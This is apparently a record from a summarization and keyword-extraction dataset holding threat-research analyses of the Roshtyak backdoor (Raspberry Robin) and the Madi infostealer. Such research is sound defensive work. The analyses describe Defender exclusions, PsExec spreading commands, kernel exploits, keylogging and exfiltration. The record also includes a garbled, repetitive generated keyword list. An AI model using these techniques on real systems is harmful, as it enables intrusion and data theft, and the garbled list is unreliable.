exploits, Roshtyak spawns (the AMD64 version of) winver.exe and gets the exploit code to run there using the KernelCallbackTable injection method. Roshtyak\u2019s implementation of this injection method essentially matches a public PoC, with the biggest difference being the usage of slightly different API functions due to the need for cross-subsystem injection (e.g. NtWow64QueryInformationProcess64 instead of NtQueryInformationProcess or NtWow64ReadVirtualMemory64 instead of ReadProcessMemory). The code injected into winver.exe is not the exploit PE itself but rather a slightly obfuscated shellcode, designed to load the exploit PE into memory.The kernel exploits target certain unpatched versions of Windows. Specifically, CVE-2020-1054 is only used on Windows 7 systems where the revision number is not higher than 24552. On the other hand, the exploit for CVE- 2021-1732 runs on Windows 10, with the targeted build number range being from 16353 to 19042. Before exploiting CVE-2021-1732, Roshtyak also scans through installed update packages to see if a patch for the vulnerability is installed. It does this by enumerating the registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\Packages and checking if the package for KB4601319 (or higher) is present.Lateral movementWhen it comes to lateral movement, Roshtyak simply uses the tried and tested PsExec tool. Before executing PsExec, Roshtyak ensures it makes sense to run it by checking for a SID matching the \u201cwell-known\u201d WinAccountDomainAdminsSid group. If domain admin rights are not detected, Roshtyak skips its lateral movement phase entirely.Roshtyak attempts to get around detection by setting Defender exclusions, as PsExec is often flagged as a hacktool (for good reasons). It sets a path exclusion for %TEMP% (where it will drop PsExec and other files used for lateral13/16movement). Later, it sets up a process exclusion for the exact path from which PsExec will be executed.While we would expect PsExec to be bundled inside Roshtyak, it turns out Roshtyak downloads it on demand from url The downloaded zip archive is dropped into %TEMP% under a random name with the .zip extension. PsExec is then unzipped from this archive using the Windows Shell COM interface (IShellDispatch) into a randomly named .exe file in %TEMP%.The payload to be executed by PsExec is a self-extracting package created by a tool called IExpress. This is an archaic installer that\u2019s part of Windows, which is probably why it\u2019s used, since Roshtyak can rely on it already being on the victim machine. The installer generation is configured by a text file using the Self Extraction Directive (SED) syntax.Roshtyak\u2019s IExpress configuration templateRoshtyak uses a SED configuration template with three placeholders (%1, %2, and %3) that it substitutes with real values at runtime. As seen above, the configuration template was written in mixed-case, which is frequently used in Raspberry Robin in general. Once the SED configuration is prepared, it is written into a randomly named .txt file in %TEMP%. Then, iexpress is invoked to generate the payload using a command such as C:\\Windows\\iexpress.exe /n /q <path_to_sed_config>. The generated payload is dumped into a randomly named .exe file in %TEMP%, as configured by the TargetName directive (placeholder %1).Once the payload is generated, Roshtyak proceeds to actually run PsExec. There are two ways Roshtyak can execute PsExec. The first one uses the command <path_to_psexec> \\\\* -accepteula -c -d -s <path_to_payload>. Here, the \\\\* wildcard instructs PsExec to run the payload on all computers in the current domain. Alternatively, Roshtyak might run the command <path_to_psexec> @<path_to_target_file> - accepteula -c -d -s <path_to_payload>. Here, the target_file is a text file containing a specific list of computers to run the payload on. Roshtyak builds this list by enumerating Active Directory objects using API functions exported from activeds.dll.Profiling the victimUSB worms tend to have a life of their own. Since their worming behavior is usually completely automated, the threat actor who initially deployed the worm doesn\u2019t necessarily have full control over where it spreads. This is why it\u2019s important for threat actors to have the worm beacon back to their C&C servers. With a beaconing mechanism in place, the threat actor can be informed about all the machines under their control and can use this knowledge to manage the worm as a whole.The outgoing beaconing messages typically contain some information about the infected machine. This helps financially-motivated cybercriminals decide on how to best monetize the infection. Roshtyak is no exception to this, and it collects a lot of information about each infected victim. Roshtyak concatenates all the collected information into a large string, using semicolons as delimiters. This large string is then exfiltrated to one of Roshtyak\u2019s C&C servers. The exfiltrated pieces of information are listed below, in order of concatenation.External IP address (obtained during a Tor connectivity check) A string hardcoded into Roshtyak\u2019s code, e.g. AFF123 (we can\u2019t be sure what\u2019s the meaning behind this, but it looks like an affiliate ID) A 16-bit hash of the DLL\u2019s PE header (with some fields zeroed out) xored with the lower 16 bits of its TimeDateStamp. The TimeDateStamp appears to be specially crafted so that the xor results in a known value. This could function as a tamper check or a watermark. Creation timestamp of the System Volume Information folder on the system drive The volume serial number of the system drive Processor count (GetActiveProcessorCount) IsWow64Process (_PROCESS_EXTENDED_BASIC_INFORMATION.Flags & 2)14/16Windows version (KUSER_SHARED_DATA.Nt(Major|Minor)Version) Windows product type (KUSER_SHARED_DATA.NtProductType) Windows build number (PEB.OSBuildNumber) Local administrative privileges (ZwQueryInformationToken(TokenGroups)/CheckTokenMembership, check for DOMAIN_ALIAS_RID_ADMINS) Domain administrative privileges (check for WinAccountDomainAdminsSid/WinAccountDomainUsersSid) System time (KUSER_SHARED_DATA.SystemTime) Time zone (KUSER_SHARED_DATA.TimeZoneBias) System locale (NtQueryDefaultLocale(0)) User locale (NtQueryDefaultLocale(1)) Environment variables (username, computername, userdomain, userdnsdomain, and logonserver) Java version (GetFileVersionInfo(\"javaw.exe\") -> VerQueryValue) Processor information (cpuid to obtain the Processor Brand String) Path to the image of the main executable module (NtQueryVirtualMemory(MemorySectionName)) Product ID and serial number of the main physical drive (DeviceIoControl(IOCTL_STORAGE_QUERY_PROPERTY, StorageDeviceProperty)) MAC address of the default gateway (GetBestRoute -> GetIpNetTable) MAC addresses of all network adapters (GetAdaptersInfo) Installed antivirus software (root\\securitycenter2 -> SELECT * FROM AntiVirusProduct) Display device information (DeviceId, DeviceString, dmPelsWidth, dmPelsHeight, dmDisplayFrequency) (EnumDisplayDevices -> EnumDisplaySettings) Active processes (NtQuerySystemInformation(SystemProcessInformation)) Screenshot encoded in base64 (gdi32 method)BeaconingOnce collected, Roshtyak sends the victim profile to one of its C&C servers. The profile is sent over the Tor network, using a custom comms module Roshtyak injects into a newly spawned process. The C&C server processes the exfiltrated profile and might respond with a shellcode payload for the core module to execute.Let\u2019s now take a closer look at this whole process. It\u2019s worth mentioning that before generating any malicious traffic, Roshtyak first performs a Tor connectivity check. This is done by contacting 28 legitimate and well-known .onion addresses in random order and checking if at least one of them responds. If none of them respond, Roshtyak doesn\u2019t even attempt to contact its C&C, as it would most likely not get through to it anyway.As for the actual C&C communication, Roshtyak contains 35 hardcoded V2 onion addresses (e.g. ip2djbz3xidmkmkw:53148, see our IoC repository for the full list). Like during the connectivity check, Roshtyak iterates through them in random order and attempts to contact each of them until one responds. Note that while V2 onion addresses are officially deprecated in favor of V3 addresses (and the Tor Browser no longer supports them in its latest version) they still appear to be functional enough for Roshtyak\u2019s nefarious purposes.Roshtyak\u2019s hardcoded C&C addressesThe victim profile is sent in the URL path, appended to the V2 onion address, along with the / character. As the raw profile might contain characters forbidden for use in URLs, the profile is wrapped in a custom structure and encoded using Base64. The very first 0x10 bytes of the custom structure serve as an encryption key, with the rest of the structure being encrypted. The custom structure also contains a 64-bit hash of the victim profile, which presumably serves as an integrity check. Interestingly, the custom structure might get its end padded with random bytes. Note that the full path could be pretty large, as it contains a doubly Base64-encoded screenshot. The authors of Roshtyak were probably aware that the URL path is not suitable for sending large amounts of data and decided to cap the15/16length of the victim profile at 0x20000 bytes. If the screenshot makes the exfiltrated profile larger than this limit, it isn\u2019t included.When the full onion URL is constructed, Roshtyak goes ahead to launch its Tor comms module. It first spawns a dummy process to host the comms module. This dummy process is randomly chosen and can be one of dllhost.exe, regsvr32.exe, or rundll32.exe. The comms module is injected into the newly spawned process using a shared section, obfuscated through the previously described shellcode hiding technique. The comms module is then executed via NtQueueApcThreadEx, using the already discussed ntdll gadget trick. The injected comms module is a custom build of an open-source Tor library packed in three additional protective shellcode layers.The core module communicates with the comms module using shared sections as an IPC mechanism. Both modules synchronously use the same PRNG with the same seed (KUSER_SHARED_DATA.Cookie) to generate the same section name. Both then map this named section into their respective address spaces and communicate with each other by reading/writing to it. The data read/written into the section is encrypted with RC4 (the key also generated using the synchronized PRNGs).The communication between the core module and the comms module follows a simple request/response pattern. The core module writes an encrypted onion URL (including the URL path to exfiltrate) into the shared section. The comms module then decrypts the URL and makes an HTTP request over Tor to it. The core module waits for the comms module to write the encrypted HTTP response back to the shared section. Once it\u2019s there, the core module decrypts it and unwraps it from a custom format (which includes decrypting it yet again and computing a hash to check the payload\u2019s integrity). The decrypted payload might include a shellcode for the core module to execute. If the shellcode is present, the core module allocates a huge chunk of memory, hides the shellcode there using the shellcode hiding technique, and executes it in a new thread. This new thread is hidden using the NtSetInformationThread -> ThreadHideFromDebugger technique (including a follow-up anti-hooking check using NtGetInformationThread to confirm that the NtSetInformationThread call did indeed succeed). ConclusionIn this blog post, we took a technical deep dive into Roshtyak, the backdoor payload associated with Raspberry Robin. The main focus was to describe how to deal with Roshtyak\u2019s protection mechanisms. We showed some never- before-seen anti-debugger/anti-sandbox/anti-VM tricks and discussed Roshtyak\u2019s heavy obfuscation. We also described Roshtyak\u2019s core functionality. Specifically, we detailed how it establishes persistence, escalates privileges, moves laterally, and uses Tor to download further payloads.We have to admit that reverse engineering Roshtyak was certainly no easy task. The combination of heavy obfuscation and numerous advanced anti-analysis tricks made it a considerable challenge. Nick Harbour, if you\u2019re looking for something to repurpose for next year\u2019s final Flare-On challenge, this might be it.Indicators of Compromise (IoCs)IoCs are available at url Copyright \u00a9 Avast Software s.r.o.16/16 ", "generated_text": "Avast; a backdoor; the DLL; a worm; 2016; use; removable drives; 550K; users; the worm; obfuscation techniques; evasion techniques; sandboxes; the malware; the loop; Code; commands; a random recursion; a chance; detection; the check; the loop; the worm; functionality; a command; process; the shell; a shortcut; safety; the example; a shortcut; a KEY; the key; the Trojan; the shellcode; the DLL; a recursion; C2; commands; the worm; files; the DLL; a shortcut; the shortcut; a C2 key; the recursion key; a C2; the shortcut; the C2 key; the shortcut; the C2 key; the shortcut; the shortcut; a shortcut; an exit key; the C2 key; the C2 key; the shortcut; the shortcut; the shortcut; the key; the shortcut; the USB; the shortcut; the C2 key; the C2 key; the C2 key", "ref_text": "<START-1>The PDF discusses the malware Raspberry Robin, specifically focusing on its heavily protected DLL backdoor called Roshtyak. Roshtyak employs numerous advanced anti-analysis techniques to avoid detection, including anti-debugger, anti-sandbox, anti-VM, and anti-emulation checks. If any check succeeds in detecting the analysis environment, Roshtyak will terminate itself, crash intentionally, enter an infinite loop, or execute fake adware payload. The fake payload tricks analysts into thinking the malware is harmless. Roshtyak's code is heavily obfuscated through control flow flattening, function activation keys, variable masking, and other techniques. It is packed in up to 14 layers, each serving a specific protective purpose. The obfuscation hinders static analysis. The core functionality of Roshtyak is to establish persistence, escalate privileges, move laterally, and download additional payloads. The malware uses encrypted kernel exploits to escalate privileges, which are decrypted on demand. Roshtyak downloads PsExec on demand from a specific URL and drops it into a temporary directory under a random name. The payload to be executed by PsExec is a self-extracting package created by a tool called IExpress, which is an ancient Windows installer. It profiles victims by collecting system information and exfiltrating it to C2 servers over Tor. The servers can respond with new shellcode for execution. Reverse engineering Roshtyak is very challenging due to the combination of heavy obfuscation and numerous advanced anti-analysis tricks. The PDF aims to help fellow researchers recognize and respond to similar malware tricks, and harden analysis environments against the described evasion techniques. <END-1>", "t5/keyword/hint_hit_precision": 0.11940298507462686, "t5/word/hint_hit_recall": 0.0411522633744856, "gpt3/lexical/rouge_rouge1": 0.37142857142857144, "gpt3/lexical/rouge_rouge2": 0.13218390804597702, "gpt3/lexical/rouge_rougeL": 0.21714285714285714, "gpt3/lexical/rouge_rougeLsum": 0.21714285714285714, "gpt3_generated_text": ["The article discusses the sophisticated backdoor malware Roshtyak, used by the Raspberry Robin worm, which spreads through infected removable drives and has affected over 550K users. The malware is heavily obfuscated with multiple protective layers, anti-analysis checks, and evasion techniques to avoid detection. If a detection check is successful, the malware takes various actions such as terminating itself, crashing intentionally, entering an infinite loop, or loading a fake payload. The article provides a detailed analysis of the malware's functionality and protection mechanisms. Despite the prevalence of Raspberry Robin, many questions remain unanswered about its objectives and origins."]}, {"split_name": "val", "sample_id": "val_61", "prompt_text": "Extract the keywords: The 'Madi' infostealers - a detailed analysisOn 17 July, we published a blog about Madi and the ongoing campaign used to infiltrate computer systems throughout the Middle East that has targeted users in Iran, Israel, Afghanistan and other individuals scattered across the globe. Here is the follow up with a detailed analysis of the infostealer used in the campaign.InstallationThe infostealer is installed by one of the various downloaders used in the attacks, which can be separated into two categories:Downloaders using the social engineering techniques described in our first blog post (displaying pictures, movies, documents etc.) to trick the user Downloaders that simply download and install the infostealerBoth types of downloaders copy themselves as \"UpdateOffice.exe\" into the \"Printhood\" directory, e.g.: \"C:Documents and Settings%USER%PrintHoodUpdateOffice.exe\" where they start executing.Both the infostealer and downloaders create fake files with random names in their respective folders. The downloaders also drop some files which assist the malware (see our first blog for details).Only one file will be used by the infostealer: nam.dll. This file is created by the downloader in the \"Templates\" directory (e.g.: \"C:Documents and Settings%USER%Templatesnam.dll\") and contains a BOT prefix/build that will be used by the infostealer when connecting to the command and control server (C&C). In order to download and install the infostealer, the downloaders connect to the C&C server to request an HTM page.Older variants use url address]/ASLK/khaki/Abi/UUUU.htm, whereas more recent ones use \"url address]/ASLK/asgari/mah/UeUeUeUe.htm\".The HTM page is a copy of Google index, with a double BASE64 encoded executable embedded in the page:The keyword \"tamamshodfile\" at the bottom will be explained in the 'Infostealer analysis' section below.The downloaders simply parse the HTM file, and decode the Base64 payload twice and save the resulting PE file as \"iexplore.exe\" in the \"Templates\" directory. Once downloaded, the infostealer is executed.Infostealer analysis: Iexplore.exeAll the versions of the infostealer have an Internet Explorer icon, and were written in Delphi.The version used in this article, which appears to have been compiled on 10 June 2012, is packed using UPX 3.08.The file is rather big: 415 KB packed, and 1.14 MB once unpacked.One peculiarity of the infostealer used in the Madi campaign is the heavy use of Delphi Timers. There are 52 of them as you can see on the screenshot below:.Numerous bugs were discovered during the analysis of the infostealer. Some of them won't be discussedhere as we don't want to help the authors improve their malware.TForm4.FormCreate:Upon execution, the first activity of interest performed by the infostealer happens inside TForm4.FormCreate.It starts with the setup of a keylogger. In order to do so, Madi infostealer uses the Windows function \"SetWindowsHookEx\" with the \"WH_KEYBOARD_LL\" Id_Hook.Once the keylogger has been installed, the infostealer reads the \"nam.dll\" file (dropped by the downloader) to get the BOT prefix and concatenates it with the computer name. Hereafter this will be referred to as \"BOTID_TMP\". The final BOTID contains some numbers derived from the \"C:\" Volume Serial Number, as we will see later on.The following timers are then disabled in this specific order:Timer1, Timer16, Timer18, Timer17, Timer20, Timer19, Timer24, Timer8, Timer30, Timer31, Timer33, Timer34, Timer36, Timer37, Timer38, Timer39, Timer40, Timer41, Timer44, Timer45, Timer46, Timer48, Timer49, Timer50.The malware uses a lot of external files to receive commands, which is another indicator of poor programming skills. Those files are used to inform the malware about the infection status. In order to avoid confusion, hereafter, when referring to a file, it is in the malware directory (\"Templates\" directory), unless stated otherwise.The infostealer looks for the following files:\"fsdiskget.dll\": If found, it enables Timer 23 \u2013 otherwise, disables it.\"nrbindek.dll\" : If found, it enables Timer 28 \u2013 otherwise, disables it.\"specialfile.dll\": If found, it deletes it.\"filesend.xls\": Doesn't actually look for it; just tries to delete it.\"begirnagir.htp\" : If NOT found, it disables Timer3\"filebind.xls\": If found, it enables Timer29 \u2013 otherwise, disables it.Next, Timer14 and Timer13 are both disabled.The Trojan looks for \"First.dll\", which is created the first time the malware is executed.If already present, the code returns from TForm4.FormCreate. Otherwise, the following happens.It creates first.dll with a hardcoded stream of bytes (not a real .dll, like the .dll mentioned above, as we will see later on when we analyze the timers more closely).Like the downloaders, the infostealer also generates fake files with random names. Before returning from TForm4.FormCreate, 6 loops will be executed:XLS: 51 fake XLS files with random names (7 characters) are generated using a hardcoded stream of bytes.EXE: 51 fake EXE files with random names (6 characters) are generated using a hardcoded stream of bytes.DLL: 201 fake DLL files with random names (9 characters) are generated using a hardcoded stream of bytes.TXT: 51 fake TXT files with random names (4 characters) are generated using a hardcoded stream of bytes.XML: 51 fake XML files with random names (8 characters) are generated using a hardcoded stream of bytes.HTM: 51 fake HTM files with random names (8 characters) are generated using a hardcoded stream of bytes.Keylogger analysis:As mentioned before, the keylogger setup is done in the TForm4.FormCreate. It uses \"SetWindowsHookEx\" with the \"WH_KEYBOARD_LL\" Id_hook to intercept keystrokes.The hook function is rather rudimentary. For instance, it uses the GetAsyncKeyState, with the \"VK_BACK\" to find out if the victim used backspace.For each typed key, there is a handler to save which key was typed in the keylogger buffer \"poki65_pik_log\":It comes as no real surprise that the keylogger is very basic and makes no use of any advanced technologies.The malware uses 52 timers. Therefore, we will group them by actions, in order to make the overall analysis easier to follow.Command and control: ProtocolWe are now going to cover all the timers responsible for contacting the C&C server and receiving commands to execute on the infected machine, and all the various handlers used to execute actionsaccording to those orders.Note: In many routines, Madi creates \".bat\" files in order to ping the C&C server to see if it is up or not and saves the result in a special file. Each file has a different name. If these files are referenced, we will provide the timer number responsible for its creation.The server manager looks like this:The GUI was probably rushed, but it serves its purpose. It can be used to create specific tasks for victims. See Timer 12 to see how each command is handled by the infostealer.Timer 1: Check-inInterval: 25 secondsBefore receiving commands, the infostealer connects to the C&C to a special page. I call it the check-in routine. Here is the description:Timer 1 gets the ApplicationName and concatenates it with \".pkklm\" (See Timer 15 description for details on how this file is created). It tries to open that file, looking for the \"Reply From\" string (when the IP responds to a ping). If it's not found, it disables Timer 1 and returns.If present, the last part of the BOTID is generated using the \"C:\" Volume Serial Number.Basically, the API function GetVolumeInformationW is called to get the Volume Serial Number, which isthen concatenated to the BOTID_TMP generated in the TForm4.FormCreate. Now that the final BOTID has been generated, the final URL that is visited is generated as follows:BOTID|COMPUTERNAME|VolumeSerialNumber/dastor/file.htm e.g.: abaanu5|MYCOMPUTER- 8712422C|6D8704FE/dastor/file.htmThe final URL is visited using Internet Explorer (IE) instrumentation. (e.g.: url visited, it enables Timer 18, disables Timer 1 and returns.This is the checking-in process, which can tell the attackers when a victim computer is ready to receive commands.Once the attackers have decided to send commands to the infected computer, a \"das.htm\" will be available in the \"/dastor/\" folder.Timer 16: Visit commands pageInterval: 25 secondsTimer 1 gets the ApplicationName and concatenates it with \".pkxm\" (ping results from Timer 11). It tries to open that file, looking for the \"Reply From\" string (when the IP responds to a ping).If it's not found, it disables Timer 16 and returns.The Final BOTID is computed (see Timer 1 description) to build the URL that is visited in order to receive commands. Before visiting that URL, the \"dast.xls\" file is deleted (see Timer 17 below).The URL is visited using IE instrumentation. Timer 17 is enabled, and Timer 16 disabled.Timer 17: Save the command page as \"dast.xls\"Interval: 20 secondsNote: During the execution of the Madi infostealer, many instances of IE are running.Timer 17 will go through all the different instances of instrumented IE, looking for pages with \"dastor\" in their title. Once found, the content of the page (without the title) is saved as \"dast.xls\".If nothing is found, it will go to next IE instance, and repeat the checks until no instances are left. If nothing is found, a clean-up routine is launched.At the end of the Timer 17, it looks for \" - dastor - Windows Internet Explorer\" and different variants (Internet Explorer) and sends a \"WM_Close\" Message using the \"PostMessageW\" function in order to close the page. Among all those captions, it also looks for \" - 404 - File or directory not found\" and variants of 404 pages, if the page wasn't found.Once the clean-up is completed, Timer 17 disables itself and returns. At this point, we have a local file with the commands to execute on the infected machine.Timer 12: Command dispatcherThis timer is responsible for parsing the command file. In order to make the description a little easier to follow, here is a sample command file:When executed, Timer 12 is disabled.The infostealer Trojan then checks if the file \"dast.xls\" is present (created by Timer 17, see above).If it's not present, Timer 12 is re-enabled and returns.The next stage of the process opens \"dast.xls\" which searches for commands to execute (see the command file above). Lots of commands can be sent simultaneously, meaning Timer 12 will not stop parsing when one command is found. Here is the full logic of the parsing:PIK: If the command file contains the word \"pik\", it checks if the status of Timer 3 is enabled. (Timer 3 is a webmail, social network and IM screen capture routine.) If not enabled, Timer 3 is enabled, and screen monitoring begins. Command parsing continues. If the \"pik\" command is not found, Timer3 is disabled.DESK: If the command file contains the word \"desk\", it checks if the status of Timer 13 is enabled. (Timer 13 is a screen capture routine.) If not enabled, Timer 13 is enabled, and screen monitoring begins. Command parsing continues. If the \"desk\" command is not found, Timer13 is disabled.SOUND: If the command file contains the word \"sound\", it checks if the status of Timer 14 is enabled. (Timer 14 is a sound recording routine.) If not enabled, Timer 14 is enabled, and sound recording begins. Command parsing continues. If the \"sound\" command is not found, Timer14 is disabled.If the command file contains the word \"newfi\", nothing happens. This is probably a leftover from older code.UPDATE:If the command file contains the word \"update\", it checks to see if it also contains a version number, which must be different from current version (\"1.1.6\" in the analyzed sample). If neither of those two conditions are valid, it goes to the next command parsing. The checking routine is very simplistic and assumes that the version number will be higher, not lower. It is therefore possible to downgrade the Trojan.If the required update criteria are met, it will create \"Update.dll\". (Update.dll is made from a hardcoded stream of bytes and isn't a valid DLL.)The Trojan now locates the \"STARTUP\" folder where a copy of the \"UpdateOffice.exe\" (Trojan downloader) is found, and executes it using ShellExecute. (In the first part of the article, we explained how the downloader downloads and installs the infostealer.)The Trojan downloader is necessary in order for updates to occur. If the downloader has been deleted for some reason, the update won't be performed.Once executed, Timer 12 terminates its execution, as the infostealer executable (iexplore.exe) will be overwritten by the Trojan downloader with a newer version and executed.DELETE:If the command file contains the word \"delete\", it will create \"delete.dll\", using exactly the same stream of bytes that is used in \"update.dll\".The Trojan now locates the \"STARTUP\" folder where a copy of the \"UpdateOffice.exe\" downloader is located, and deletes it. Once deleted, it then proceeds to terminate itself.At this point, upon the next reboot, the infection isn't restarted.Note: The infostealer doesn't restart by itself, allowing an automatic update every time the computer reboots.On the other hand all the other downloader files (non-malicious) are still present in the /printhood/ folder. The full folder of the infostealer is still present, as is the malware.BIND: If neither \"update\" nor \"delete\" are found, Timer 12 checks if the command file contains the word \"bind\" and creates \"nrbindek.dll\" using exactly the same stream of bytes that is used in \"update.dll\".Nothing else happens at this point. However, as we have seen in the Form creation, upon execution, the malware checks whether \"nrbindek.dll\" is present.If it is present, Timer 12 will enable Timer 28.If \"bind\" isn't found, the parsing continues with the next command.DISKGO: If the command file contains the word \"diskgo\", it will create \"lbdiskgo.dll\", using exactly the same stream of bytes that is used in \"update.dll\". Parsing continues with next command.Note: \"lbdiskgo.dll\" is checked by Timer 42 and Timer 43.DISKGET: If the command file contains the word \"diskget\", it will create \"fskdiskget.dll\", using exactly the same stream of bytes that is used in \"update.dll\" and enable Timer 23.Timer 12 then checks whether \"specialfile.dll\" is present. If NOT, it will look for the file extensions included in the command that was received. The attackers select from a list of 27 extensions that are provided by the C&C server, and which can be selected using a Remote Control Tool (see at the beginning of the Timer 12 description to view the extensions listed in the sample command file). Each file extension is separated by a special marker \"$.$\".Timer 12 searches for the \"$.$\" marker. If it's not present, the parsing stops there.If the marker is present, it saves those extensions to the \"specialfile.dll\" and enables Timer 26.Note: Specialfile.dll is therefore used to tell the malware what file extensions to look for and Timer 26 will handle diskget.Afterwards, or if specialfile.dll was already present, it will check whether the \"logfi.dll\" is present, and stop parsing commands if it is not.If the file is present, it looks in the command buffer for the word \"file\" and exits the commands parsing if not found.If logfil.dll is present, it will search files on fixed hard drives and remote drives. The authors' poor programming skills are quite noticeable in this part of the code.It is also interesting to note that it will search for \"MHTML\" files, even if that option isn't available in the Server Control tool, and that they made a duplicate entry in the hardcode list of files that need to be to located (htm is present twice).File types searched:*.*txt/*.*jpg/*.*doc/*.*pdf/*.*bmp/*.*docx/*.*mdb/*.*xls/*.*csv/*.*html/*.*avi/ *.*mp3/*.*wave/*.*htm/*.*rar/*.*zip/*.*htm (again?!)/*.*gif/*.*7z/*.*jar/*.*JPEG/*.*mp4/*.*3gp/ *.*dat/*.*MPEG/*.*SWF/*.*WMV/*.*xml/*.*MHTML/Total of 29 extensions, with one duplicate. 27 extensions are present in the Server Control tool and one that is not (MHTML).It saves the log file as \"logfi.dll\" for each hard drive and creates a backup as \"logfi.dll.BMH\". It will overwrite the logs for each iteration of the loop.It only search files on remote and fixed drives, not on USB/external drives; that's for the logging part.Once the Parsing is complete, Timer 12 re-enables itself and exits.MonitoringTimer 3: PIK handler \u2013 Webmail, social network and IM screen captureInterval: 60 seconds.Timer 3 creates a \"begirnagir.htp\" file.It then checks whether the user has been surfing or using the following applications and takes a screen capture if found:gmail, hotmail, yahoo! mail, google+, msn messenger, blogger, massenger (?), profile,icq, paltalk, yahoo! messenger for the web, skype, facebook.The screen captures are saved as a JPG using the following name convention: mm-dd-yyyy-hhnnss. The \"Now\" and \"FormateDateTime\" functions are used.Timer 13: DESK handler \u2013 Screen captureInterval: 3 minutesNote: The GUI used to control the bot says 2 minutes, but the code doesn't lie.Timer 13 takes screen captures every 3 minutes. They are saved using the following name convention: mm-dd-yyyy-hhnnss. The \"Now\" and \"FormateDateTime\" functions are used.The files are in JPG format.Timer 14: SOUND handler \u2013 Recording soundThis timer is responsible for starting the audio recording using the mci* functions from winmm.dll.The following commands are used: \"OPEN NEW TYPE WAVEAUDIO ALIAS mysound\", \"SET mysound TIME FORMAT MS BITSPERSAMPLE 8 CHANNELS 1 SAMPLESPERSEC 8000 BYTESPERSEC 8000\" and finally \"RECORD mysound\". Once the commands are sent, Timer 30 is enabled, and Timer 14 returns.Timer 30: Started by Timer 14 (sound command handler)Interval: 60 secondsThis timer does anything apart from start Timer 31 when it is time to save the recoded audio.Timer 31: Started by Timer 30 (when it is time to save audio recordings)When sufficient time has passed since the start of audio recording, Timer 31 disables Timer 30, stops the recording by sending the following command: \"STOP mysound\".To save audio files, it sends the \"SAVE mysound\" command. The files are saved using the following name convention: mm-dd-yyyy-hhnnss. The \"Now\" and \"FormateDateTime\" functions are used.The final file is saved as .wav.BMH.Timer 31 is then disabled, and Timer 14 (Sound handler) is re-nabled for the next audio recording.Timer 32: Set up keyloggerInterval: 60 secondsEven though the keylogger setup is performed when the application starts, in the FormCreate routine Timer 32 sets up the keylogger every 60 seconds. The details of the keylogger have already been described earlier in this document.Timer 2: Creation of keylogger logsInterval: 10 secondsTimer 2 starts by getting the current user name (GetUserName API Function), and then checks if the \"poki65.pik\" file is present. This file is the current ongoing keylogging file. If it's not present, it looks for \"solt.html\", which indicates whether the keylogger has created its first log yet.If none of those files are present, it means it is the first time the keylogger has started logging.The first log file is different from subsequent log files, as it contains more information. The Madi keylogger files use HTML tags and colors to make them easier to read.For the first log, it executes \"cmd.exe /c ipconfig /allcompartments > ipconfig.txt\"It waits 5 seconds and appends the content of \"ipconfig.txt\" to the HTML content that is created.The computer name as well as the current user name is appended to the log, followed by the list of available drives: Floppy Drive, Fixed Drive, Network Drive, CD-Rom Drive and RAM Disk.Finally, a full list of installed software, including security patches, is appended to the log file, as can be seen on the screenshot below:Once this part is completed, it creates a file called \"solt.htm\" containing the word \"wertik\".It will continue formatting the poki65 log file. At the very beginning you can see the \"Content-Language\" set to \"fa\", which is Persian.This is how the keylogger logs are generated.Timer 4: Insert time stamps and tags to display screen captures into keylogger logs.Interval: 1 millisecondTimer 4 is responsible for inserting IMG tags inside the keylogger log. It is also responsible for adding the time stamp taken from the C&C server (see Miscellaneous section, Timer 7 and 8).Timer 6: Backup keylogger log for exfiltrationTimer 6 searches for the poki65.pik file - the current log session. If not found, it returns.It then looks for the size of the log file. If it is lower than 15 KB, it will return. Only log files bigger than 15 KB are exfiltrated. If the size criteria is met, they are copied using the following name convention: mm-dd- yyyy-hhnnss.HTM. Timer 6 then deletes \"poki65.pik\" and returns.Note: A new log will be created by Timer 2 (solt.html tells the keylogger not to list drives, installed software etc. again).DATA STEALINGData stealing is handled by several timers. Each type of stolen data is stored in a special folder in the server. Files exfiltrated to the C&C servers are Base64 encoded.BIND:Timer 28: Started during Form Creation (related to the BIND command)Note: When the infostealer starts, Timer 28 is enabled if the file \"nrbindek.dll\" is present (created by the BIND command).Timer 28 searches for \"*.*exe\" files on all fixed hard drives. For each *EXE* file found that doesn't belong to the \"Windows\", \"Program Files\" or \"Program Files (x86)\" folders, an entry (full path to *EXE* file) isadded to the file filebind.xls.Once the hard drives have been scanned, Timer28 returns.Filebind.xls therefore contains all the executables on the fixed hard drives, except from those in Windows and Program Files.Timer 29: Started during Form Creation (related to the BIND command)Note: The code of this timer is some of the worst that is used in the infostealer. The programming, obfuscated with Delphi, is very bad.Timer 28 generates a list of *EXE* files that don't belong to the \"Windows\", \"Program Files\" or \"Program Files (x86)\" folders. For each entry of that file, Timer 29 will make a backup of the executables. The *.bind* extension is appended to their original name.Many files are used to monitor the exfiltration status of the executables.However, Timer 29 doesn't actually seem to exfiltrate anything, probably because of bugs.Timer 9: Check for files ready to be uploadedInterval: 5 secondsTimer 9 is disabled. If either Timer 19 or Timer 20 is enabled, it means there is already an active exfiltrating task. Timer 9 is enabled and it returns.Otherwise, Timer 9 searches for files *.*KILOP as well as *.htm.BMH* files in the malware directory. KILOP files are Base64 encoded versions of files to exfiltrate. If no file is found, Timer 9 is enabled and returned.If files are present, they are ready to be exfiltrated, and Timer 19 is enabled. Before returning, Timer 9 is enabled.Timer 19: Check if IE instrumentation has been used to visit the upload page.Interval: 25 secondsTimer 19 searches for a specific page title:If the page title \"new title hastam - Microsoft Internet Explorer\" is found, Timer 19 returns.\"OKshodiha - Windows Internet Explorer\" means a file is ready to be uploaded \u2013 Timer 20 is enabled andreturns.If none of those captions are found, Timer 19 starts IE_Instrumentation and visits the Sendfilejj.html page, enables Timer 20, then returns.Timer 20: File uploadTimer 20 searches for *.*KILOP files, computes the BOTID (see Timer 1 for details), and fills the POST parameters. The \"S0\", \"S1\" and \"S2\" forms present in the Sendfilejj.html are \"filled\" and the file is uploaded using IE Instrumentation.T3, is the BOTID+Folder used for uploading (see below)T2 is the file nameT1 is the Base64 encoded content of the file.To compute T3, the following folder is appended to the BOTID (each victim has a root folder named after the BOTID on the C&C).\"/Pi/\" for .jpg.BMH - Screen Captures\"Te/ for .htm.BMH - Keylogger logs\"/So/ for .wav.BMH - Audio Recordings\"/Fi/\" for important.file.BMH/Fi/CoolDisk/\" for .fildik.BMH (data stolen from removable drives)Files are sent via the Sendfilejj.html page hosted on the C&C, which is a wrapper for the \"sik.php\" script used to receive exfiltrated data.Timer 5: Base64 encoder for exfiltrated dataInterval: 1 millisecondWhen triggered, it disables Timer 5, searches for *.*BMH files (files that will be exfiltrated once Base64 encoded) 